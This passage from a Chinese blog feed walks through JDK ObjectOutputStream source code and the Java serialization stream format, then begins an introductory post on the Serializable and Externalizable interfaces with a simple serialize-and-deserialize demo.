+</span><br><span class="line">                    slotDesc.getName() + <span class="string">"\")"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                curContext = <span class="keyword">new</span> SerialCallbackContext(obj, slotDesc);</span><br><span class="line">                <span class="comment">// 刷新数据流</span></span><br><span class="line">                bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                <span class="comment">//调用自定义方法</span></span><br><span class="line">                slotDesc.invokeWriteObject(obj, <span class="keyword">this</span>);</span><br><span class="line">                bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">                bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                curContext.setUsed();</span><br><span class="line">                curContext = oldContext;</span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            curPut = oldPut;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 未自定义writeObject 默认调用属性数据序列化方法defaultWriteFields</span></span><br><span class="line">            defaultWriteFields(obj, slotDesc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现了Externalizable的类实例用writeExternalData来序列化</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeExternalData</span><span class="params">(Externalizable obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    PutFieldImpl oldPut = curPut;</span><br><span class="line">    curPut = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack.push(<span class="string">"writeExternal data"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    SerialCallbackContext oldContext = curContext;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        curContext = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 调用重写的writeExternal()方法</span></span><br><span class="line">        <span class="keyword">if</span> (protocol == PROTOCOL_VERSION_1) &#123;</span><br><span class="line">            obj.writeExternal(<span class="keyword">this</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">            obj.writeExternal(<span class="keyword">this</span>);</span><br><span class="line">            bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">            bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        curContext = oldContext;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curPut = oldPut;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="属性值信息序列化的关键-默认属性值序列化方法defaultWriteFields"><a href="#属性值信息序列化的关键-默认属性值序列化方法defaultWriteFields" class="headerlink" title="属性值信息序列化的关键-默认属性值序列化方法defaultWriteFields:"></a>属性值信息序列化的关键-默认属性值序列化方法defaultWriteFields:</h5><p>defaultWriteFields读取目标类中的属性值域，属性值是原生类型直接序列化到底层流，而非原生类型则需要递归调用writeObject0 来序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defaultWriteFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="keyword">null</span> &amp;&amp; obj != <span class="keyword">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    desc.checkDefaultSerialize();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*** 1、 Java 原生类型属性值序列化 **/</span></span><br><span class="line">    <span class="keyword">int</span> primDataSize = desc.getPrimDataSize(); <span class="comment">// 获取原生类型属性值的个数</span></span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="keyword">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="keyword">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取类中的基本数据类型的数据并保存在primVals字节数组中</span></span><br><span class="line">    desc.getPrimFieldValues(obj, primVals);</span><br><span class="line">    <span class="comment">// primVals的基本类型数据写到底层字节容器</span></span><br><span class="line">    bout.write(primVals, <span class="number">0</span>, primDataSize, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*** 2、 Java对象类型序列化，递归调用writeObject0 方法 **/</span></span><br><span class="line">    <span class="comment">// 获取对应类的所有字段对象</span></span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="keyword">false</span>);</span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> Object[desc.getNumObjFields()];</span><br><span class="line">    <span class="keyword">int</span> numPrimFields = fields.length - objVals.length;</span><br><span class="line">    <span class="comment">// 获取所有对象的属性值</span></span><br><span class="line">    desc.getObjFieldValues(obj, objVals); </span><br><span class="line">    <span class="comment">//对所有Object类型的字段循环</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.push(</span><br><span class="line">                <span class="string">"field (class \""</span> + desc.getName() + <span class="string">"\", name: \""</span> +</span><br><span class="line">                fields[numPrimFields + i].getName() + <span class="string">"\", type: \""</span> +</span><br><span class="line">                fields[numPrimFields + i].getType() + <span class="string">"\")"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writeObject0(objVals[i], fields[numPrimFields + i].isUnshared()); <span class="comment">//递归完成序列化</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对单独分析下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">desc.getPrimFieldValues(obj, primVals); <span class="comment">// 循环所有原生属性值的序列化</span></span><br><span class="line">bout.write(primVals, <span class="number">0</span>, primDataSize, <span class="keyword">false</span>); <span class="comment">// 原生类型序列化</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getPrimFieldValues</span><span class="params">(Object obj, <span class="keyword">byte</span>[] buf)</span> </span>&#123;</span><br><span class="line">    fieldRefl.getPrimFieldValues(obj, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ObjectStreamClass#getPrimFieldValues</span></span><br><span class="line"><span class="comment">// 循环所有原生属性值的序列化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getPrimFieldValues</span><span class="params">(Object obj, <span class="keyword">byte</span>[] buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 循环基元数据的类型的序列化：根据类型循环写入属性值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numPrimFields; i++) &#123;</span><br><span class="line">        <span class="keyword">long</span> key = readKeys[i];</span><br><span class="line">        <span class="keyword">int</span> off = offsets[i];</span><br><span class="line">        <span class="keyword">switch</span> (typeCodes[i]) &#123; <span class="comment">//（例子分析：本例typeCodes[i]是&#123;Z、I、S、L、L&#125;，需要跟前面属性名顺序对应，比如boolField在第一个，其值在该块也是第一个）</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'Z'</span>:</span><br><span class="line">                <span class="comment">//（例子分析：写入boolField值Fales，0x00</span></span><br><span class="line">                Bits.putBoolean(buf, off, unsafe.getBoolean(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'B'</span>:</span><br><span class="line">                buf[off] = unsafe.getByte(obj, key);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'C'</span>:</span><br><span class="line">                Bits.putChar(buf, off, unsafe.getChar(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">                <span class="comment">//（例子分析：写入shortField值12，0x000c</span></span><br><span class="line">                Bits.putShort(buf, off, unsafe.getShort(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'I'</span>:</span><br><span class="line">                <span class="comment">//（例子分析：写入intField值112，0x00000070</span></span><br><span class="line">                Bits.putInt(buf, off, unsafe.getInt(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">                Bits.putFloat(buf, off, unsafe.getFloat(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'J'</span>:</span><br><span class="line">                Bits.putLong(buf, off, unsafe.getLong(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">                Bits.putDouble(buf, off, unsafe.getDouble(obj, key));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（例子分析：第三部分属性值域序列化，按照之前每个属性信息序列化的顺序来写入其对应值，非原生属性值本例是<code>00 00 00 00 70  00 0c</code>，写入非原生类型的属性值，这里不再说明，自行调试）</p><h3 id="六、总结-对象流输出规则"><a href="#六、总结-对象流输出规则" class="headerlink" title="六、总结-对象流输出规则"></a>六、总结-对象流输出规则</h3><p><img src="/imgs/image-20210701160611733.png" alt="image-20210701160611733"></p><p>1、首先在序列化对象时，把序列化对象的信息分为三部分来存储，如上图：</p><ul><li><p>第一部分是序列化头信息：用于描述序列化协议的信息和版本；</p></li><li><p>第二部分是类元信息的序列化：用于描述序列化类的名称，属性和父类的名称、属性；</p></li><li><p>第三部分是属性域的值的描述：用于记录当前类中属性的值。</p></li></ul><p>2、第二部分描述的规则如下：<br>（1）首先声明标记的是TC_OBJECT = 0x73；<br>（2）接下来声明一个新类的描述TC_CLASSDESC = 0x72，写入目标类名长度、类名、序列化ID、标记该类使用的序列化方式；<br>（3）然后标记类属性域的个数、属性类型、属性名称长度、属性名称，如果是非原生类型还有写入类的非原生类型长度和名称<br>（4）添加标记对象数据块结束标识TC_ENDBLOCKDATA  = 0x78<br>（5）然后开始父类的描述，标记的方式和前面一致，当再没有新的父类时，添加标记TC_NULL  = 0x70<br>另外再提下，目标类本身的类名描述是以”java.io”形式 而如果是属性的非原生类型类名是以”Ljava/io;”标注的，一个是”.”一个是”/“。</p><p>3、第三部分的描述规则：<br>按照从父类到子类的顺序填充属性域的实际值，而对象的属性按照从基本数据类型到对象类型的顺序填充实际值。</p><p>4、在第二部分和第三部分都采用了递归的方式进行填充。</p><p>另外，Java序列化永远只会<strong>对类属性序列化</strong>，因为我们只要知道了类的全称，那么方法在内部都一样的，只管去调用就好了；在ObjectOutputStream中专门有一个内部类去处理原生类型的写入，所有的非原生类最终都是由原生类型组成的，非原生类归根结底还是原生类型，<strong>所以最终还是落到原生类型的序列化上面</strong>。</p><h3 id="更新-defaultWriteObject"><a href="#更新-defaultWriteObject" class="headerlink" title="更新-defaultWriteObject"></a>更新-defaultWriteObject</h3><p>我们在一些类重写writeObject时经常看到会调用defaultWriteObject方法，这里补充下。</p><p>方法很简单，在块模式中调用defaultWriteFields写入目标对象的属性域信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">defaultWriteObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    SerialCallbackContext ctx = curContext;</span><br><span class="line">    <span class="keyword">if</span> (ctx == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotActiveException(<span class="string">"not in call to writeObject"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Object curObj = ctx.getObj();</span><br><span class="line">    ObjectStreamClass curDesc = ctx.getDesc();</span><br><span class="line">    bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">    defaultWriteFields(curObj, curDesc);</span><br><span class="line">    bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>defaultWriteFields具体如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defaultWriteFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass(); <span class="comment">//类描述信息</span></span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="keyword">null</span> &amp;&amp; obj != <span class="keyword">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    desc.checkDefaultSerialize();<span class="comment">//检查是否支持序列化</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> primDataSize = desc.getPrimDataSize(); <span class="comment">//获取类中可序列化的属性的个数</span></span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="keyword">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="keyword">byte</span>[primDataSize]; <span class="comment">//写入属性个数</span></span><br><span class="line">    &#125;</span><br><span class="line">    desc.getPrimFieldValues(obj, primVals);</span><br><span class="line">    bout.write(primVals, <span class="number">0</span>, primDataSize, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="keyword">false</span>);</span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> Object[desc.getNumObjFields()];</span><br><span class="line">    <span class="keyword">int</span> numPrimFields = fields.length - objVals.length;</span><br><span class="line">    desc.getObjFieldValues(obj, objVals);</span><br><span class="line">    <span class="comment">// 循环写入所有属性信息</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.push(</span><br><span class="line">                <span class="string">"field (class \""</span> + desc.getName() + <span class="string">"\", name: \""</span> +</span><br><span class="line">                fields[numPrimFields + i].getName() + <span class="string">"\", type: \""</span> +</span><br><span class="line">                fields[numPrimFields + i].getType() + <span class="string">"\")"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 调用writeObject0写入每个属性对象</span></span><br><span class="line">            writeObject0(objVals[i],fields[numPrimFields + i].isUnshared());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://docs.oracle.com/javase/8/docs/api/" target="_blank" rel="noopener">Java API 8</a><br><a href="https://www.cnblogs.com/yanggb/p/10664155.html" target="_blank" rel="noopener">https://www.cnblogs.com/yanggb/p/10664155.html</a><br><a href="https://blog.csdn.net/jenny_995368/article/details/99672570" target="_blank" rel="noopener">https://blog.csdn.net/jenny_995368/article/details/99672570</a><br><a href="https://developer.aliyun.com/article/636145" target="_blank" rel="noopener">https://developer.aliyun.com/article/636145</a><br><a href="https://blog.csdn.net/weixin_33843947/article/details/89618157" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33843947/article/details/89618157</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> 序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDK序列化机制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDK序列化机制及源码解读一：Serializable和Externalizable</title>
      <link href="2021/06/27/JDK%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB%E4%B8%80%EF%BC%9ASerializable%E5%92%8CExternalizable/"/>
      <url>2021/06/27/JDK%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB%E4%B8%80%EF%BC%9ASerializable%E5%92%8CExternalizable/</url>
      
        <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>为了Java反序列化漏洞打下深厚基础，特意学习总结了Java序列化机制及源码解读系列，便于分享和日后巩固。</p><p>主要记录以下四个方面：</p><p>1、Serializable和Externalizable，序列化接口</p><p>2、ObjectOutputStream对象输出流深入解读</p><p>3、ObjectInputStream对象输入流深入解读</p><p>4、拓展知识学习</p><h3 id="初识序列化"><a href="#初识序列化" class="headerlink" title="初识序列化"></a>初识序列化</h3><p>首先认识下序列化。序列化就是把<strong>对象转换成字节流</strong>，便于保存在内存、文件、数据库中；反序列化即逆过程，把字节流还原成对象。Java序列化时会序列化该对象的类信息、属性及属性值，不能序列化对象的方法。</p><p><img src="/imgs/image-20200604162949988.png" alt="image-20200604162949988"></p><p>先看下序列化用途：</p><p>（1）永久性保存对象，保存对象的字节序列到<strong>本地文件或者数据库中</strong>； </p><p>（2）通过序列化以字节流的形式使对象在<strong>网络中进行传递和接收</strong>；</p><p>（3）通过序列化在<strong>进程间传递对象</strong>。</p><p>一些知识铺垫：</p><p>1、标记接口：Java中的标记接口（Marker Interface），又称标签接口（Tag Interface），具体是不包含任何方法的接口。在Java中，标记接口主要有以下两种目的：一是建立一个公共的父接口。比如EventListener接口，一个由几十个其它接口扩展的Java API，当一个接口继承了EventListener接口，JVM就知道该接口将要被用于一个事件的代理方案。同样的，你可以使用一个标记接口来建立一组接口的父接口。二是向一个类添加数据类型。这种情况是标记接口最初的目的，实现标记接口的类不需要定义任何接口方法（因为标记接口根本就没有方法），但是该类通过Java的多态性可以变成一个接口类型。</p><p>标记接口因为没有任何方法所以其本身并不“工作”，顾名思义，它只是将类标记为特定类型。在一些代码中可以检查标记是否存在，并根据这些信息进行一些操作，例如可以通过<code>if (instance instanceof MyMarkerInterface) {...}</code>来进行判断某个对象是否是标记类的实例化，然后再去进行一些操作。</p><h3 id="如何序列化和反序列化？"><a href="#如何序列化和反序列化？" class="headerlink" title="如何序列化和反序列化？"></a>如何序列化和反序列化？</h3><p>一般序列化至少需要以下步骤：</p><ol><li>创建一个类实现Serializable接口，并设置serialVersionUID（最好设置下，默认可不设置。设置方法可以百度IDEA设置serialVersionUID）</li><li>创建一个对象输出流ObjectOutputStream</li><li>调用对象输出流的writeObject方法把对象转换成字节流输出</li></ol><p>一般反序列化至少需要以下步骤：</p><ol><li>创建一个对象输入流ObjectInputStream</li><li>调用对象输入流的readObject方法把字节流转为对象</li></ol><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//要序列化的类必须实现Serializable</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandExec</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="comment">// 设置serialVersionUID</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">6211228684695072792L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//任意方法，可忽略</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String cmd = <span class="string">"calc"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            InputStream is = process.getInputStream();</span><br><span class="line">            InputStreamReader isr = <span class="keyword">new</span> InputStreamReader(is);</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(String content = br.readLine(); content != <span class="keyword">null</span>; content = br.readLine()) &#123;</span><br><span class="line">                System.out.println(content);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">            var7.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 序列化测试：序列化和反序列化CommandExec实例</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">/* 序列化对象：由对象转为字节流 */</span></span><br><span class="line">        CommandExec commandExec1 = <span class="keyword">new</span> CommandExec();</span><br><span class="line">        <span class="comment">//创建 ObjectOutputStream 对象输出流，最终输出流到文件</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">"e:\\test.txt"</span>)));</span><br><span class="line">        <span class="comment">//写入对象到输出流</span></span><br><span class="line">        oos.writeObject(commandExec1);</span><br><span class="line">        System.out.println(<span class="string">"对象序列化成功！"</span>);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 反序列化：由字节流转为对象 */</span></span><br><span class="line">        <span class="comment">// 创建 ObjectInputStream 对象输入流，从文件读取流</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">"e:\\test.txt"</span>)));</span><br><span class="line">        <span class="comment">//读取对象</span></span><br><span class="line">        CommandExec commandExec2 = (CommandExec) ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">"对象反序列化成功！"</span>);</span><br><span class="line">        <span class="comment">//调用对象的方法</span></span><br><span class="line">        commandExec2.exec();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="/imgs/image-20210629210351251.png" alt="image-20210629210351251"></p><p>test.txt文件:</p><p><img src="/imgs/image-20210629210525001.png" alt="image-20210629210525001"></p><p>除了java.io.Serializable，JDK还提供了另外一种原生序列化接口java.io.Externalizable，接下来深入学习这两种接口。</p><h4 id="Serializable序列化接口"><a href="#Serializable序列化接口" class="headerlink" title="Serializable序列化接口"></a>Serializable序列化接口</h4><p>java.io.Serializable是一个标记接口，仅用于<strong>标识</strong>类的可序列化，它没有任何接口需要去实现。</p><p>这里拓展下：标记接口因为没有任何方法所以其本身并不“工作”，顾名思义，它只是将类标记为特定类型。在一些代码中可以检查标记是否存在，并根据这些信息进行一些操作，例如可以通过<code>if (instance instanceof MyMarkerInterface) 